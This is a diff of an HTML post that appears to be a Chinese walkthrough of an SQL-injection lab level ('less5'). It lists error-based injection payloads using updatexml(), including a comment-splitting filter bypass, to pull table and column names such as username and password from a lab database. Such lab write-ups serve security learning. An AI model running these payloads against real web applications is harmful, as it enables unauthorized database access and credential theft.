@@ -508,10 +508,10 @@
 <h2>less5</h2>
 
 <p>感觉应该是什么东西被过滤了，因为本地没办法bp抓包进行模糊测试，所以我尝试了报错注入</p>
-<p>‘ or updatexml(1,concat(‘`’,database()),1) –+</p>
-<p>‘ or updatexml(1,concat(‘`’,(select group_concat(distinct table_name) from information_schema.tables where table_schema=database())),1) –+</p>
+<p>‘ or updatexml(1,concat(‘`’,database()),1) –+ security</p>
+<p>‘) or updatexml(1,concat(‘`’,(select group_concat(distinct table_name) from info/**/rmation_schema.tables where table_schema=’security’)),1) #</p>
 <p>emails,referers,uagents,users</p>
-<p>‘ or updatexml(1,concat(‘`’,(select group_concat(distinct right(column_name,30)) from information_schema.columns where table_name=’users’)),1) –+</p>
+<p>‘) or updatexml(1,concat(‘`’,(select group_concat(distinct right(column_name,30)) from information_schema.columns where table_name=’users’)),1) –+</p>
 <p>avatar,CURRENT_CONNECTIONS,fail’很显然。这没有出来晚</p>
 <p>atar,er,ername,er_id,iled_logi<br>avatar,CURRENT_CONNECTIONS,failed_login,first_name,id,last_login,last_name,password,TOTAL_CONNECTIONS,user,username,user_id</p>
 <p>‘ or updatexml(1,concat(‘`’,(select group_concat(left(column_name,8)) from information_schema.columns where table_name=’users’)),1) –+</p>
